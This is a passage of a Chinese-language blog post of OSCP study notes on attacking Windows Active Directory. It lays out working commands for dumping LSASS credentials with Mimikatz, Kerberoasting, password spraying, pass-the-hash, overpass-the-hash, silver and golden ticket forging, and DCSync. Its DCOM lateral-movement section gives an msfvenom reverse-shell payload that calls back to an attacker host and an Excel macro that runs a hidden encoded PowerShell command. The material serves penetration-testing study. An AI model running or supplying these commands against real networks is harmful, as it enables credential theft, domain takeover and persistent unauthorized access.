+<li><p>读取LSASS进程内存的dump文件</p>
+<ul>
+<li>sekurlsa::minidump C:\Users\Documents\lsass.dmp</li>
+</ul>
+</li>
+<li><p>TGT和ST也缓存于LSASS内存中，可使用Mimiktz获取票据攻击Kerberos认证过程<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901154600.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>窃取ST将允许我们访问票据关联的特定资源</p>
+</li>
+<li><p>利用TGT可以请求其他资源的ST（读取和伪造票据实现AD攻击）</p>
+</li>
+<li><p>Mimikatz可以导出票据文件，然后倒入其他主机的LSASS</p>
+</li>
+</ul>
+<h3 id="服务账号密码爆破"><a href="#服务账号密码爆破" class="headerlink" title="服务账号密码爆破"></a>服务账号密码爆破</h3><ul>
+<li>用户访问SPN时，需要向DC请求ST，此时DC并不验证用户是否有权请求SPN服务</li>
+<li>应用服务器会解密并验证票据（由SPN账号的密码HASH加密）</li>
+<li>这意味着只要知道SPN名，即可向DC请求其ST，然后提取内存中的ST</li>
+<li>由于ST使用服务账号HASH加密，因此当服务账号为高权限域用户（域管理员组）时，可以尝试爆破其密码</li>
+<li>向指定SPN请求ST<ul>
+<li><code> Add-Type -AssemblyName System.IdentityModel</code></li>
+<li><code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#39;H TTP/CorpWebServer.corp.com&#39;</code></li>
+</ul>
+</li>
+<li>显示新增的缓存ST<ul>
+<li><code>PS C:\Users\offsec.CORP&gt; klist</code></li>
+</ul>
+</li>
+<li>导出上面缓存的ST<ul>
+<li><code>mimikatz # kerberos::list /export</code></li>
+</ul>
+</li>
+<li>破解SPN服务账号密码<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901162550.png" srcset="/img/loading.gif" lazyload></li>
+<li>低慢速密码破解<ul>
+<li>爆破密码过程中可能会出现账号被锁</li>
+<li>先查询账号锁定次数<ul>
+<li><code>net accounts</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901165426.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>密码喷射<ul>
+<li>使用一个最常用密码字典针对域内所有用户执行密码破解攻击</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901170400.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+</ul>
+<h2 id="AD横向移动"><a href="#AD横向移动" class="headerlink" title="AD横向移动"></a>AD横向移动</h2><h3 id="AD横向移动-1"><a href="#AD横向移动-1" class="headerlink" title="AD横向移动"></a>AD横向移动</h3><ul>
+<li>密码破解耗时且成功率不高，可以利用密码HASH或票据直接横向移动</li>
+<li>PtH登录域内其他主机<ul>
+<li>不可用于Kerberos身份认证，只能用于NTLM身份认证</li>
+<li>企业内网通常开放SMB服务，可以利用管理共享，PtH实现代码执行（需要本地管理员权限）</li>
+<li><code>kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 eb3b9f05c425e //10.11.0.22 cmd</code></li>
+<li>这种方法使用于AD域账号、administrator账号，但其他本地管理员账号不可用</li>
+</ul>
+</li>
+<li>使用impacket包<ul>
+<li><code>kali@kali:~$ impacket-vmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2 oscp/bob@10.0.2.68</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="Overpass-the-Hash"><a href="#Overpass-the-Hash" class="headerlink" title="Overpass the Hash"></a>Overpass the Hash</h3><ul>
+<li>基于已知的用户NTLM HASH获得TGT、ST，从而访问其他主机和服务</li>
+<li>跨越哈希攻击的本质是将NTLM HASH转换成TGT，避免使用NTLM身份认证</li>
+<li>以管理员的NTLM HASH运行Powerhsell进程<ul>
+<li><code>mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe</code></li>
+</ul>
+</li>
+<li>通过使用 <code>net use</code> 对域控制器上的网络共享进行身份验证来生成 TGT<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901172004.png" srcset="/img/loading.gif" lazyload></li>
+<li>远程桌面受限管理<ul>
+<li><code>mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe</code></li>
+<li><code>Enter-PSSession -Computer Target</code></li>
+</ul>
+</li>
+<li>利用psexec在DC上执行系统命令<ul>
+<li><code>PS C:\Tools\active_directory&gt; .\PsExec.exe \\dc01 cmd.exe</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h3><ul>
+<li><p>TGT只在生成的计算机上可用，ST更加灵活。PtT导出ST并重新注入到网络的其他地方，可用于对特定服务的身份验证。如果ST输入当前用户，则不需要管理员特权</p>
+</li>
+<li><p>这种攻击并没有提升权限，但可以选择在哪台目标主机上使用ST</p>
+</li>
+<li><p>如果服务账号密码或HASH泄漏，就可以伪造ST访问目标应用，这就是白银票据</p>
+</li>
+<li><p>Mimikatz可以伪造银票，并将其注入到内存中 &#x2F;ptt</p>
+</li>
+<li><p>创建票据受限需要知道域SID。查看当前用户SID，从中提取域SID<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901181145.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>基于域SID生成银票，并将其注入到内存中</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span> # kerberos::purge<br><span class="hljs-attribute">mimikatz</span> # kerberos::list<br><span class="hljs-attribute">mimikatz</span> # kerberos::golden /user:offsec /domain:corp.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1602875587</span>-<span class="hljs-number">278</span> <span class="hljs-number">7523311</span>-<span class="hljs-number">2599479668</span> /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748 <span class="hljs-number">290</span>D87AA966C327 /ptt<br><span class="hljs-attribute">mimikatz</span> # kerberos::list<br></code></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901181704.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>此时在目标服务看来，当前账号拥有本地以及域管理员权限，如果服务类型允许，有可能实现操作系统命令执行(MSSQL)</p>
+</li>
+</ul>
+<h3 id="利用DCOM横向移动"><a href="#利用DCOM横向移动" class="headerlink" title="利用DCOM横向移动"></a>利用DCOM横向移动</h3><ul>
+<li>COM是进程间交互组建的创建系统，DCOM则用于跨网络对主机之间的交互。DCOm需要本地管理员权限调用DCOM服务控制器，通过RPC（TCP 135）实现交互。</li>
+<li>于Office相关的DCOM对象可用于横向移动，需要目标主机上安装有Office，该技术主要针对客户端</li>
+<li>首先，我们必须首先使用 PowerShell 发现此 DCOM 对象的可用方法或子对象。使用 PowerShell 和 System.Activator 类的 CreateInstance 方法创建对象的实例。使用 GetTypeFromProgID 方法提供其类型<ul>
+<li><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgId(&quot;Excel.Application&quot;, &quot;192 .168.1.110&quot;))</code></li>
+</ul>
+</li>
+<li>使用启动 notepad.exe 的 VBA 宏，文件保存为.xls格式<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Sub</span> mymacro()<br>Shell (<span class="hljs-string">&quot;notepad.exe&quot;</span>)<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure></li>
+<li>通过SMB将文件拷贝到目标计算机上<ul>
+<li><code>$LocalPath = &quot;C:\Users\jeff_admin.corp\myexcel.xls&quot;</code></li>
+<li><code>$RemotePath = &quot;\\192.168.1.110\c$\myexcel.xls&quot;</code></li>
+<li><code>[System.IO.File]::Copy($LocalPath, $RemotePath, $True)</code></li>
+</ul>
+</li>
+<li>创建SYSTEM账号配置文件<ul>
+<li><code>$Path = &quot;\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;</code></li>
+<li><code>$temp = [system.io.directory]::createDirectory($Path)</code></li>
+</ul>
+</li>
+<li>完整调用Open方法<ul>
+<li><code>query_08.ps1</code></li>
+</ul>
+</li>
+<li>改造以上代码，生产反弹shell文件<ul>
+<li><code>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f h ta-psh -o evil.hta</code></li>
+</ul>
+</li>
+<li>使用以下脚本将payload切成小块<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ.....&quot;</span><br>n = <span class="hljs-number">50</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>), n):<br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Str = Str + &quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-built_in">str</span>[i:i+n] + <span class="hljs-string">&#x27;&quot;&#x27;</span><br></code></pre></td></tr></table></figure></li>
+<li>修改宏代码，植入payload<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ps1">Sub MyMacro()<br>  Dim Str As String<br>  Str = Str + <span class="hljs-string">&quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad&quot;</span><br>  Str = Str + <span class="hljs-string">&quot;ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA&quot;</span><br>  Str = Str + <span class="hljs-string">&quot;EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM&quot;</span><br>  Str = Str + <span class="hljs-string">&quot;AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA&quot;</span><br>  Shell (Str)<br><span class="hljs-keyword">End</span> Sub<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="AD持久化"><a href="#AD持久化" class="headerlink" title="AD持久化"></a>AD持久化</h2><h3 id="AD持久化控制"><a href="#AD持久化控制" class="headerlink" title="AD持久化控制"></a>AD持久化控制</h3><ul>
+<li>金票（声明用户为域管理员组成员）<ul>
+<li>客户端请求TGT时，KDC使用krbtgt的HASH加密。如果获得此哈希，可自定义TGT，即金票</li>
+<li>krbtgt的密码HASH只在域级别从2003升级到2008时改变</li>
+<li>前提要求已经获得域管理员组权限，以此获取krbtgt账号的密码HASH</li>
+<li><code>mimikatz # privilege::debug</code></li>
+<li><code>mimikatz # lsadump::lsa /patch</code></li>
+</ul>
+</li>
+<li>创建金票并植入内存，不需要管理员权限，甚至不需要加域（只要有HASH）</li>
+<li>首先删除现有Kerberos票据，然后为fakeuser创建金票<ul>
+<li><code>kerberos::purge</code></li>
+<li><code>kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2 787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="AD持久化-1"><a href="#AD持久化-1" class="headerlink" title="AD持久化"></a>AD持久化</h3><ul>
+<li>当使用金票时，mimikatz提供两组默认值，用户ID为500，组ID为域中高权限组组合</li>
+<li>水平移动<ul>
+<li><code>mimikatz # misc::cmd</code></li>
+<li><code>C:\Users\offsec.crop&gt; psexec.exe \\dc01 cmd.exe</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220901230101.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+</li>
+<li>如果fakeuser不存在，报错会记录。因此可使用真实存在的管理员账号和ID</li>
+</ul>
+<h3 id="DC同步"><a href="#DC同步" class="headerlink" title="DC同步"></a>DC同步</h3><ul>
+<li>另一种AD持久化方法时窃取所有管理员的HASH</li>
+<li>使用mimikatz在域控上查询全部HASH</li>
+<li>拷贝NTDS.dit文件</li>
+<li>从客户端远程获取所有用户的HASH</li>
+<li>DC同步（replication）<ul>
+<li>接收更新请求的域控制器不会验证该请求是否来自已知的域控制器，而只会验证关联的 SID 是否具有适当的权限</li>
+</ul>
+</li>
+<li>使用域管理员账号登录工作站，mimikatz同步指定域账号<ul>
+<li><code>mimikatz # lsadump::dcsync /user:Administrator</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>1. 枚举用户名、组、嵌套</strong></p>
+<p><strong>2. 枚举登录账号、会话</strong></p>
+<p><strong>3. HASH</strong></p>
+<p><strong>4. PtH</strong></p>
+<p><strong>5. Overpass the Hash</strong></p>
+<p><strong>6. 破解SPN服务账号</strong></p>
+<p><strong>7. Pass the Ticket(银票)</strong></p>
+<p><strong>8. 持久化</strong></p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/OSCP-Notes/" class="category-chain-item">OSCP-Notes</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP/">#OSCP</a>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
+      
+        <a href="/tags/AD%E5%9F%9F/">#AD域</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>攻击活动目录</div>
+      <div>https://c47sh4rk.github.io/2022/08/18/攻击活动目录/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>C47Sh4rk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月18日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/21/%E8%A7%A3%E5%86%B3VMware%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%88%B0%E9%9D%B6%E6%9C%BAIP%E7%9A%84%E9%97%AE%E9%A2%98/" title="解决VMware获取不到靶机IP的问题">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">解决VMware获取不到靶机IP的问题</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/18/%E9%9A%A7%E9%81%93%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" title="隧道与端口转发">
+                        <span class="hidden-mobile">隧道与端口转发</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
